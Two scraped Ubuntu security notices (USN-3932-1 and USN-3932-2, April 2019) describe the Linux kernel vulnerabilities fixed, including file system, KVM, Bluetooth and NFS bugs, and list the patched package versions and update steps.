Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3932-2: Linux kernel (Xenial HWE) vulnerabilities

2 April 2019

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [linux-aws](/security/cves?package=linux-aws) - Linux kernel for Amazon Web Services (AWS) systems
* [linux-lts-xenial](/security/cves?package=linux-lts-xenial) - Linux hardware enablement kernel from Xenial for Trusty

## Details

USN-3932-1 fixed vulnerabilities in the Linux kernel for Ubuntu 16.04

LTS. This update provides the corresponding updates for the Linux

Hardware Enablement (HWE) kernel from Ubuntu 16.04 LTS for Ubuntu

14.04 LTS.

It was discovered that a race condition existed in the f2fs file system

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service. ([CVE-2017-18249](/security/CVE-2017-18249))

Wen Xu discovered that the f2fs file system implementation in the Linux

kernel did not properly validate metadata. An attacker could use this to

construct a malicious f2fs image that, when mounted, could cause a denial

of service (system crash). ([CVE-2018-13097](/security/CVE-2018-13097), [CVE-2018-13099](/security/CVE-2018-13099), [CVE-2018-13100](/security/CVE-2018-13100),

[CVE-2018-14614](/security/CVE-2018-14614), [CVE-2018-14616](/security/CVE-2018-14616))

Wen Xu and Po-Ning Tseng discovered that btrfs file system implementation

in the Linux kernel did not properly validate metadata. An attacker could

use this to construct a malicious btrfs image that, when mounted, could

cause a denial of service (system crash). ([CVE-2018-14610](/security/CVE-2018-14610), [CVE-2018-14611](/security/CVE-2018-14611),

[CVE-2018-14612](/security/CVE-2018-14612), [CVE-2018-14613](/security/CVE-2018-14613))

Vasily Averin and Evgenii Shatokhin discovered that a use-after-free

vulnerability existed in the NFS41+ subsystem when multiple network

namespaces are in use. A local attacker in a container could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2018-16884](/security/CVE-2018-16884))

It was discovered that a use-after-free vulnerability existed in the PPP

over L2TP implementation in the Linux kernel. A privileged local attacker

could use this to possibly execute arbitrary code. ([CVE-2018-9517](/security/CVE-2018-9517))

Shlomi Oberman, Yuli Shapiro, and Ran Menscher discovered an information

leak in the Bluetooth implementation of the Linux kernel. An attacker

within Bluetooth range could use this to expose sensitive information

(kernel memory). ([CVE-2019-3459](/security/CVE-2019-3459), [CVE-2019-3460](/security/CVE-2019-3460))

Jann Horn discovered that the KVM implementation in the Linux kernel

contained a use-after-free vulnerability. An attacker in a guest VM with

access to /dev/kvm could use this to cause a denial of service (guest VM

crash). ([CVE-2019-6974](/security/CVE-2019-6974))

Jim Mattson and Felix Wilhelm discovered a use-after-free vulnerability in

the KVM subsystem of the Linux kernel, when using nested virtual machines.

A local attacker in a guest VM could use this to cause a denial of service

(system crash) or possibly execute arbitrary code in the host system.

([CVE-2019-7221](/security/CVE-2019-7221))

Felix Wilhelm discovered that an information leak vulnerability existed in

the KVM subsystem of the Linux kernel, when nested virtualization is used.

A local attacker could use this to expose sensitive information (host

system memory to a guest VM). ([CVE-2019-7222](/security/CVE-2019-7222))

Jann Horn discovered that the mmap implementation in the Linux kernel did

not properly check for the mmap minimum address in some situations. A local

attacker could use this to assist exploiting a kernel NULL pointer

dereference vulnerability. ([CVE-2019-9213](/security/CVE-2019-9213))

Muyu Yu discovered that the CAN implementation in the Linux kernel in some

situations did not properly restrict the field size when processing

outgoing frames. A local attacker with CAP\_NET\_ADMIN privileges could use

this to execute arbitrary code. ([CVE-2019-3701](/security/CVE-2019-3701))

Vladis Dronov discovered that the debug interface for the Linux kernel's

HID subsystem did not properly validate passed parameters in some

situations. A local privileged attacker could use this to cause a denial of

service (infinite loop). ([CVE-2019-3819](/security/CVE-2019-3819))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 14.04

* [linux-image-4.4.0-1040-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws)
  -
  [4.4.0-1040.43](https://launchpad.net/ubuntu/%2Bsource/linux-aws/4.4.0-1040.43)
* [linux-image-4.4.0-144-generic](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial)
  -
  [4.4.0-144.170~14.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial/4.4.0-144.170~14.04.1)
* [linux-image-4.4.0-144-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial)
  -
  [4.4.0-144.170~14.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial/4.4.0-144.170~14.04.1)
* [linux-image-4.4.0-144-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial)
  -
  [4.4.0-144.170~14.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial/4.4.0-144.170~14.04.1)
* [linux-image-4.4.0-144-powerpc-e500mc](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial)
  -
  [4.4.0-144.170~14.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial/4.4.0-144.170~14.04.1)
* [linux-image-4.4.0-144-powerpc-smp](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial)
  -
  [4.4.0-144.170~14.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial/4.4.0-144.170~14.04.1)
* [linux-image-4.4.0-144-powerpc64-emb](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial)
  -
  [4.4.0-144.170~14.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial/4.4.0-144.170~14.04.1)
* [linux-image-4.4.0-144-powerpc64-smp](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial)
  -
  [4.4.0-144.170~14.04.1](https://launchpad.net/ubuntu/%2Bsource/linux-lts-xenial/4.4.0-144.170~14.04.1)
* linux-image-aws
  -
  4.4.0.1040.41
* linux-image-generic-lpae-lts-xenial
  -
  4.4.0.144.127
* linux-image-generic-lts-xenial
  -
  4.4.0.144.127
* linux-image-lowlatency-lts-xenial
  -
  4.4.0.144.127
* linux-image-powerpc-e500mc-lts-xenial
  -
  4.4.0.144.127
* linux-image-powerpc-smp-lts-xenial
  -
  4.4.0.144.127
* linux-image-powerpc64-emb-lts-xenial
  -
  4.4.0.144.127
* linux-image-powerpc64-smp-lts-xenial
  -
  4.4.0.144.127
* linux-image-virtual-lts-xenial
  -
  4.4.0.144.127

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2017-18249](/security/CVE-2017-18249)
* [CVE-2018-13097](/security/CVE-2018-13097)
* [CVE-2018-13099](/security/CVE-2018-13099)
* [CVE-2018-13100](/security/CVE-2018-13100)
* [CVE-2018-14610](/security/CVE-2018-14610)
* [CVE-2018-14611](/security/CVE-2018-14611)
* [CVE-2018-14612](/security/CVE-2018-14612)
* [CVE-2018-14613](/security/CVE-2018-14613)
* [CVE-2018-14614](/security/CVE-2018-14614)
* [CVE-2018-14616](/security/CVE-2018-14616)
* [CVE-2018-16884](/security/CVE-2018-16884)
* [CVE-2018-9517](/security/CVE-2018-9517)
* [CVE-2019-3459](/security/CVE-2019-3459)
* [CVE-2019-3460](/security/CVE-2019-3460)
* [CVE-2019-3701](/security/CVE-2019-3701)
* [CVE-2019-3819](/security/CVE-2019-3819)
* [CVE-2019-6974](/security/CVE-2019-6974)
* [CVE-2019-7221](/security/CVE-2019-7221)
* [CVE-2019-7222](/security/CVE-2019-7222)
* [CVE-2019-9213](/security/CVE-2019-9213)

## Related notices

* [USN-3932-1](/security/notices/USN-3932-1)
* [USN-4118-1](/security/notices/USN-4118-1)
* [USN-4094-1](/security/notices/USN-4094-1)
* [USN-3980-1](/security/notices/USN-3980-1)
* [USN-3981-1](/security/notices/USN-3981-1)
* [USN-3981-2](/security/notices/USN-3981-2)
* [USN-3980-2](/security/notices/USN-3980-2)
* [USN-3933-2](/security/notices/USN-3933-2)
* [USN-3933-1](/security/notices/USN-3933-1)
* [USN-3930-2](/security/notices/USN-3930-2)
* [USN-3930-1](/security/notices/USN-3930-1)
* [USN-3931-2](/security/notices/USN-3931-2)
* [USN-3931-1](/security/notices/USN-3931-1)
* [USN-4115-1](/security/notices/USN-4115-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from usn.ubuntu.com_02fe9977_20250125_213324.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-3932-1: Linux kernel vulnerabilities

2 April 2019

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 16.04 ESM](/security/notices?release=xenial)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-aws](/security/cves?package=linux-aws) - Linux kernel for Amazon Web Services (AWS) systems
* [linux-kvm](/security/cves?package=linux-kvm) - Linux kernel for cloud environments
* [linux-raspi2](/security/cves?package=linux-raspi2) - Linux kernel for Raspberry Pi 2
* [linux-snapdragon](/security/cves?package=linux-snapdragon) - Linux kernel for Snapdragon processors

## Details

It was discovered that a race condition existed in the f2fs file system

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service. ([CVE-2017-18249](/security/CVE-2017-18249))

Wen Xu discovered that the f2fs file system implementation in the Linux

kernel did not properly validate metadata. An attacker could use this to

construct a malicious f2fs image that, when mounted, could cause a denial

of service (system crash). ([CVE-2018-13097](/security/CVE-2018-13097), [CVE-2018-13099](/security/CVE-2018-13099), [CVE-2018-13100](/security/CVE-2018-13100),

[CVE-2018-14614](/security/CVE-2018-14614), [CVE-2018-14616](/security/CVE-2018-14616))

Wen Xu and Po-Ning Tseng discovered that btrfs file system implementation

in the Linux kernel did not properly validate metadata. An attacker could

use this to construct a malicious btrfs image that, when mounted, could

cause a denial of service (system crash). ([CVE-2018-14610](/security/CVE-2018-14610), [CVE-2018-14611](/security/CVE-2018-14611),

[CVE-2018-14612](/security/CVE-2018-14612), [CVE-2018-14613](/security/CVE-2018-14613))

Vasily Averin and Evgenii Shatokhin discovered that a use-after-free

vulnerability existed in the NFS41+ subsystem when multiple network

namespaces are in use. A local attacker in a container could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2018-16884](/security/CVE-2018-16884))

It was discovered that a use-after-free vulnerability existed in the PPP

over L2TP implementation in the Linux kernel. A privileged local attacker

could use this to possibly execute arbitrary code. ([CVE-2018-9517](/security/CVE-2018-9517))

Shlomi Oberman, Yuli Shapiro, and Ran Menscher discovered an information

leak in the Bluetooth implementation of the Linux kernel. An attacker

within Bluetooth range could use this to expose sensitive information

(kernel memory). ([CVE-2019-3459](/security/CVE-2019-3459), [CVE-2019-3460](/security/CVE-2019-3460))

Jann Horn discovered that the KVM implementation in the Linux kernel

contained a use-after-free vulnerability. An attacker in a guest VM with

access to /dev/kvm could use this to cause a denial of service (guest VM

crash). ([CVE-2019-6974](/security/CVE-2019-6974))

Jim Mattson and Felix Wilhelm discovered a use-after-free vulnerability in

the KVM subsystem of the Linux kernel, when using nested virtual machines.

A local attacker in a guest VM could use this to cause a denial of service

(system crash) or possibly execute arbitrary code in the host system.

([CVE-2019-7221](/security/CVE-2019-7221))

Felix Wilhelm discovered that an information leak vulnerability existed in

the KVM subsystem of the Linux kernel, when nested virtualization is used.

A local attacker could use this to expose sensitive information (host

system memory to a guest VM). ([CVE-2019-7222](/security/CVE-2019-7222))

Jann Horn discovered that the mmap implementation in the Linux kernel did

not properly check for the mmap minimum address in some situations. A local

attacker could use this to assist exploiting a kernel NULL pointer

dereference vulnerability. ([CVE-2019-9213](/security/CVE-2019-9213))

Muyu Yu discovered that the CAN implementation in the Linux kernel in some

situations did not properly restrict the field size when processing

outgoing frames. A local attacker with CAP\_NET\_ADMIN privileges could use

this to execute arbitrary code. ([CVE-2019-3701](/security/CVE-2019-3701))

Vladis Dronov discovered that the debug interface for the Linux kernel's

HID subsystem did not properly validate passed parameters in some

situations. A local privileged attacker could use this to cause a denial of

service (infinite loop). ([CVE-2019-3819](/security/CVE-2019-3819))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 16.04

* [linux-image-4.4.0-1043-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [4.4.0-1043.49](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/4.4.0-1043.49)
* [linux-image-4.4.0-1079-aws](https://launchpad.net/ubuntu/%2Bsource/linux-aws)
  -
  [4.4.0-1079.89](https://launchpad.net/ubuntu/%2Bsource/linux-aws/4.4.0-1079.89)
* [linux-image-4.4.0-1106-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [4.4.0-1106.114](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/4.4.0-1106.114)
* [linux-image-4.4.0-1110-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux-snapdragon)
  -
  [4.4.0-1110.115](https://launchpad.net/ubuntu/%2Bsource/linux-snapdragon/4.4.0-1110.115)
* [linux-image-4.4.0-145-generic](https://launchpad.net/ubuntu/%2Bsource/linux-signed)
  -
  [4.4.0-145.171](https://launchpad.net/ubuntu/%2Bsource/linux-signed/4.4.0-145.171)
* [linux-image-4.4.0-145-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.4.0-145.171](https://launchpad.net/ubuntu/%2Bsource/linux/4.4.0-145.171)
* [linux-image-4.4.0-145-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-signed)
  -
  [4.4.0-145.171](https://launchpad.net/ubuntu/%2Bsource/linux-signed/4.4.0-145.171)
* [linux-image-4.4.0-145-powerpc-e500mc](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.4.0-145.171](https://launchpad.net/ubuntu/%2Bsource/linux/4.4.0-145.171)
* [linux-image-4.4.0-145-powerpc-smp](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.4.0-145.171](https://launchpad.net/ubuntu/%2Bsource/linux/4.4.0-145.171)
* [linux-image-4.4.0-145-powerpc64-emb](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.4.0-145.171](https://launchpad.net/ubuntu/%2Bsource/linux/4.4.0-145.171)
* [linux-image-4.4.0-145-powerpc64-smp](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [4.4.0-145.171](https://launchpad.net/ubuntu/%2Bsource/linux/4.4.0-145.171)
* [linux-image-aws](https://launchpad.net/ubuntu/%2Bsource/linux-meta-aws)
  -
  [4.4.0.1079.82](https://launchpad.net/ubuntu/%2Bsource/linux-meta-aws/4.4.0.1079.82)
* [linux-image-generic](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.4.0.145.153](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.4.0.145.153)
* [linux-image-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.4.0.145.153](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.4.0.145.153)
* [linux-image-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-meta-kvm)
  -
  [4.4.0.1043.43](https://launchpad.net/ubuntu/%2Bsource/linux-meta-kvm/4.4.0.1043.43)
* [linux-image-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.4.0.145.153](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.4.0.145.153)
* [linux-image-powerpc-e500mc](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.4.0.145.153](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.4.0.145.153)
* [linux-image-powerpc-smp](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.4.0.145.153](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.4.0.145.153)
* [linux-image-powerpc64-emb](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.4.0.145.153](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.4.0.145.153)
* [linux-image-powerpc64-smp](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.4.0.145.153](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.4.0.145.153)
* [linux-image-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-meta-raspi2)
  -
  [4.4.0.1106.106](https://launchpad.net/ubuntu/%2Bsource/linux-meta-raspi2/4.4.0.1106.106)
* [linux-image-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux-meta-snapdragon)
  -
  [4.4.0.1110.102](https://launchpad.net/ubuntu/%2Bsource/linux-meta-snapdragon/4.4.0.1110.102)
* [linux-image-virtual](https://launchpad.net/ubuntu/%2Bsource/linux-meta)
  -
  [4.4.0.145.153](https://launchpad.net/ubuntu/%2Bsource/linux-meta/4.4.0.145.153)

After a standard system update you need to reboot your computer to make

all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2017-18249](/security/CVE-2017-18249)
* [CVE-2018-13097](/security/CVE-2018-13097)
* [CVE-2018-13099](/security/CVE-2018-13099)
* [CVE-2018-13100](/security/CVE-2018-13100)
* [CVE-2018-14610](/security/CVE-2018-14610)
* [CVE-2018-14611](/security/CVE-2018-14611)
* [CVE-2018-14612](/security/CVE-2018-14612)
* [CVE-2018-14613](/security/CVE-2018-14613)
* [CVE-2018-14614](/security/CVE-2018-14614)
* [CVE-2018-14616](/security/CVE-2018-14616)
* [CVE-2018-16884](/security/CVE-2018-16884)
* [CVE-2018-9517](/security/CVE-2018-9517)
* [CVE-2019-3459](/security/CVE-2019-3459)
* [CVE-2019-3460](/security/CVE-2019-3460)
* [CVE-2019-3701](/security/CVE-2019-3701)
* [CVE-2019-3819](/security/CVE-2019-3819)
* [CVE-2019-6974](/security/CVE-2019-6974)
* [CVE-2019-7221](/security/CVE-2019-7221)
* [CVE-2019-7222](/security/CVE-2019-7222)
* [CVE-2019-9213](/security/CVE-2019-9213)

## Related notices

* [USN-3932-2](/security/notices/USN-3932-2)
* [USN-4118-1](/security/notices/USN-4118-1)
* [USN-4094-1](/security/notices/USN-4094-1)
* [USN-3980-1](/security/notices/USN-3980-1)
* [USN-3981-1](/security/notices/USN-3981-1)
* [USN-3981-2](/security/notices/USN-3981-2)
* [USN-3980-2](/security/notices/USN-3980-2)
* [USN-3933-2](/security/notices/USN-3933-2)
* [USN-3933-1](/security/notices/USN-3933-1)
* [USN-3930-2](/security/notices/USN-3930-2)
* [USN-3930-1](/security/notices/USN-3930-1)
* [USN-3931-2](/security/notices/USN-3931-2)
* [USN-3931-1](/security/notices/USN-3931-1)
* [USN-4115-1](/security/notices/USN-4115-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

